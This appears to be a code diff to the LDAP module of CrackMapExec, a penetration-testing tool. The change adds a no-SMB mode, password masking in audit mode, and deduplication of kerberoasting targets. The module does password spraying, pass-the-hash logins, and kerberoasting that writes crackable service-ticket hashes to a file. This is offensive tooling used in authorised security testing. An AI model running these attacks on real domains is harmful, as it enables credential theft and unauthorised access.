@@ -19,6 +19,8 @@ from impacket.ldap import ldap as ldap_impacket
 from impacket.krb5 import constants
 from impacket.ldap import ldapasn1 as ldapasn1_impacket
 from io import StringIO
+from pywerview.cli.helpers import *
+from pywerview.requester import RPCRequester
 
 ldap_error_status = {
     "533":"STATUS_ACCOUNT_DISABLED",
@@ -59,6 +61,7 @@ class ldap(connection):
         ldap_parser.add_argument("--no-bruteforce", action='store_true', help='No spray when using file for username and password (user1 => password1, user2 => password2')
         ldap_parser.add_argument("--continue-on-success", action='store_true', help="continues authentication attempts even after successes")
         ldap_parser.add_argument("--port", type=int, choices={389, 636}, default=389, help="LDAP port (default: 389)")
+        ldap_parser.add_argument("--no-smb", action='store_true', help='No smb connection')
         dgroup = ldap_parser.add_mutually_exclusive_group()
         dgroup.add_argument("-d", metavar="DOMAIN", dest='domain', type=str, default=None, help="domain to authenticate to")
         dgroup.add_argument("--local-auth", action='store_true', help='authenticate locally to each target')
@@ -109,50 +112,66 @@ class ldap(connection):
         return 0
 
     def enum_host_info(self):
-        self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]
-
-        try:
-            self.conn.login('' , '')
-        except:
-            #if "STATUS_ACCESS_DENIED" in e:
-            pass
-
-        self.domain    = self.conn.getServerDNSDomainName()
-        self.hostname  = self.conn.getServerName()
-        self.server_os = self.conn.getServerOS()
-        self.signing   = self.conn.isSigningRequired() if self.smbv1 else self.conn._SMBConnection._Connection['RequireSigning']
-        self.os_arch   = self.get_os_arch()
-
-        self.output_filename = os.path.expanduser('~/.cme/logs/{}_{}_{}'.format(self.hostname, self.host, datetime.now().strftime("%Y-%m-%d_%H%M%S")))
-
-        if not self.domain:
-            self.domain = self.hostname
-
-        try:
-            '''plaintext_login
-                DC's seem to want us to logoff first, windows workstations sometimes reset the connection
-                (go home Windows, you're drunk)
-            '''
-            self.conn.logoff()
-        except:
-            pass
-
-        if self.args.domain:
+        # smb no open, specify the domain
+        if self.args.no_smb:
             self.domain = self.args.domain
-        
-        if self.args.local_auth:
-            self.domain = self.hostname
+            #self.logger.extra['hostname'] = self.hostname
+        else:
+            self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]
 
-        #Re-connect since we logged off
-        self.create_conn_obj()
+            try:
+                self.conn.login('' , '')
+            except:
+                #if "STATUS_ACCESS_DENIED" in e:
+                pass
+
+            self.domain    = self.conn.getServerDNSDomainName()
+            self.hostname  = self.conn.getServerName()
+            self.server_os = self.conn.getServerOS()
+            self.signing   = self.conn.isSigningRequired() if self.smbv1 else self.conn._SMBConnection._Connection['RequireSigning']
+            self.os_arch   = self.get_os_arch()
+
+            self.output_filename = os.path.expanduser('~/.cme/logs/{}_{}_{}'.format(self.hostname, self.host, datetime.now().strftime("%Y-%m-%d_%H%M%S")))
+            self.output_filename = self.output_filename.replace(":", "-")
+
+            if not self.domain:
+                self.domain = self.hostname
+
+            try:
+                '''plaintext_login
+                    DC's seem to want us to logoff first, windows workstations sometimes reset the connection
+                    (go home Windows, you're drunk)
+                '''
+                self.conn.logoff()
+            except:
+                pass
+
+            if self.args.domain:
+                self.domain = self.args.domain
+            
+            if self.args.local_auth:
+                self.domain = self.hostname
+
+            #Re-connect since we logged off
+            self.create_conn_obj()
+        
 
     def print_host_info(self):
-        self.logger.info(u"{}{} (name:{}) (domain:{}) (signing:{}) (SMBv1:{})".format(self.server_os,
-                                                                                      ' x{}'.format(self.os_arch) if self.os_arch else '',
-                                                                                      self.hostname,
-                                                                                      self.domain,
-                                                                                      self.signing,
-                                                                                      self.smbv1))
+        if self.args.no_smb:
+            self.logger.extra['protocol'] = "LDAP"
+            self.logger.extra['port'] = "389"
+            self.logger.info(u"Connecting to LDAP {}".format(self.hostname))
+            #self.logger.info(self.endpoint)
+        else:
+            self.logger.extra['protocol'] = "SMB"
+            self.logger.info(u"{}{} (name:{}) (domain:{}) (signing:{}) (SMBv1:{})".format(self.server_os,
+                                                                                            ' x{}'.format(self.os_arch) if self.os_arch else '',
+                                                                                            self.hostname,
+                                                                                            self.domain,
+                                                                                            self.signing,
+                                                                                            self.smbv1))
+            self.logger.extra['protocol'] = "LDAP"
+            #self.logger.info(self.endpoint)
         return True
 
     def kerberos_login(self, domain, aesKey, kdcHost):
@@ -189,6 +208,10 @@ class ldap(connection):
                 self.ldapConnection = ldap_impacket.LDAPConnection('ldaps://%s' % target, self.baseDN, self.kdcHost)
                 self.ldapConnection.kerberosLogin(self.username, self.password, self.domain, self.lmhash, self.nthash,
                                                 self.aesKey, kdcHost=self.kdcHost)
+                
+                out = u'{}{}'.format('{}\\'.format(self.domain),
+                                                self.username)
+                
                 self.logger.extra['protocol'] = "LDAPS"
                 self.logger.extra['port'] = "636"
                 self.logger.success(out)
@@ -237,13 +260,14 @@ class ldap(connection):
             # Connect to LDAP
             out = u'{}{}:{} {}'.format('{}\\'.format(domain),
                                                 username,
-                                                password,
+                                                password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                 highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else ''))
             self.logger.extra['protocol'] = "LDAP"
             self.logger.extra['port'] = "389"
             self.logger.success(out)
 
-            add_user_bh(self.username, self.domain, self.logger, self.config)
+            if not self.args.local_auth:
+                add_user_bh(self.username, self.domain, self.logger, self.config)
             if not self.args.continue_on_success:
                 return True
 
@@ -260,14 +284,14 @@ class ldap(connection):
                     errorCode = str(e).split()[-2][:-1]
                     self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
                                                     self.username, 
-                                                    self.password,
+                                                    self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                     ldap_error_status[errorCode] if errorCode in ldap_error_status else ''),
                                                     color='magenta' if errorCode in ldap_error_status else 'red')
             else:
                 errorCode = str(e).split()[-2][:-1]
                 self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
                                                  self.username, 
-                                                 self.password,
+                                                 self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                  ldap_error_status[errorCode] if errorCode in ldap_error_status else ''),
                                                  color='magenta' if errorCode in ldap_error_status else 'red')
             return False
@@ -275,7 +299,7 @@ class ldap(connection):
         except OSError as e:
             self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
                                                  self.username, 
-                                                 self.password,
+                                                 self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                  "Error connecting to the domain, please add option --kdcHost with the FQDN of the domain controller"))
             return False
 
@@ -326,13 +350,14 @@ class ldap(connection):
             self.check_if_admin()
             out = u'{}{}:{} {}'.format('{}\\'.format(domain),
                                     username,
-                                    nthash,
+                                    nthash if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                     highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else ''))
             self.logger.extra['protocol'] = "LDAP"
             self.logger.extra['port'] = "389"
             self.logger.success(out)
 
-            add_user_bh(self.username, self.domain, self.logger, self.config)
+            if not self.args.local_auth:
+                add_user_bh(self.username, self.domain, self.logger, self.config)
             if not self.args.continue_on_success:
                 return True
         except ldap_impacket.LDAPSessionError as e:
@@ -348,21 +373,21 @@ class ldap(connection):
                     errorCode = str(e).split()[-2][:-1]
                     self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
                                                     self.username, 
-                                                    self.password,
+                                                    nthash if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                     ldap_error_status[errorCode] if errorCode in ldap_error_status else ''),
                                                     color='magenta' if errorCode in ldap_error_status else 'red')
             else:
                 errorCode = str(e).split()[-2][:-1]
                 self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
                                                  self.username, 
-                                                 self.password,
+                                                 nthash if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                  ldap_error_status[errorCode] if errorCode in ldap_error_status else ''),
                                                  color='magenta' if errorCode in ldap_error_status else 'red')
             return False
         except OSError as e:
             self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
                                                  self.username, 
-                                                 self.nthash,
+                                                 nthash if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                  "Error connecting to the domain, please add option --kdcHost with the FQDN of the domain controller"))
             return False
 
@@ -393,12 +418,14 @@ class ldap(connection):
         return True
 
     def create_conn_obj(self):
-        if self.create_smbv1_conn():
+        if not self.args.no_smb:
+            if self.create_smbv1_conn():
+                return True
+            elif self.create_smbv3_conn():
+                return True
+            return False
+        else:
             return True
-        elif self.create_smbv3_conn():
-            return True
-
-        return False
 
     def sid_to_str(self, sid):
 
@@ -652,23 +679,26 @@ class ldap(connection):
                     pass
 
             if len(answers)>0:
-                #users = dict( (vals[1], vals[0]) for vals in answers)
                 TGT = KerberosAttacks(self).getTGT_kerberoasting()
+                dejavue = []
                 for SPN, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation in answers:
-                    try:
-                        serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
-                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.domain,
-                                                                                self.kdcHost,
-                                                                                TGT['KDC_REP'], TGT['cipher'],
-                                                                                TGT['sessionKey'])
-                        r = KerberosAttacks(self).outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName, SPN)
-                        self.logger.highlight(u'sAMAccountName: {} memberOf: {} pwdLastSet: {} lastLogon:{}'.format(sAMAccountName, memberOf, pwdLastSet, lastLogon))
-                        self.logger.highlight(u'{}'.format(r))
-                        with open(self.args.kerberoasting, 'a+') as hash_kerberoasting:
-                            hash_kerberoasting.write(r + '\n')
-                    except Exception as e:
-                        logging.debug("Exception:", exc_info=True)
-                        logging.error('SPN: %s - %s' % (SPN,str(e)))
+                    if sAMAccountName not in dejavue:
+                        try:
+                            serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
+                            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.domain,
+                                                                                    self.kdcHost,
+                                                                                    TGT['KDC_REP'], TGT['cipher'],
+                                                                                    TGT['sessionKey'])
+                            r = KerberosAttacks(self).outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName, SPN)
+                            self.logger.highlight(u'sAMAccountName: {} memberOf: {} pwdLastSet: {} lastLogon:{}'.format(sAMAccountName, memberOf, pwdLastSet, lastLogon))
+                            self.logger.highlight(u'{}'.format(r))
+                            with open(self.args.kerberoasting, 'a+') as hash_kerberoasting:
+                                hash_kerberoasting.write(r + '\n')
+                            dejavue.append(sAMAccountName)
+                        except Exception as e:
+                            logging.debug("Exception:", exc_info=True)
+                            logging.error('SPN: %s - %s' % (SPN,str(e)))
+                return True
             else:
                 self.logger.highlight("No entries found!")
                 return
